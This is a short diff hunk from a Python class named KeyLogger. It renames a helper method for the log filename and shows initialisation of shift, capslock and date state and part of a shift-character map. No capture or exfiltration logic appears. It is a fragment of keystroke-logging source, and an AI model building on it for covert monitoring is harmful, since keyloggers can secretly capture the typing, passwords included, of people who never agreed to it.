@@ -17,7 +17,7 @@ class KeyLogger:
         self.shift_pressed = False
         self.capslock_on = False
         self.current_date = datetime.now().date()
-        self.log_filename = self.get_log_filename()
+        self.log_filename = self._get_log_filename()
     
         self.shift_map = { 
             '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
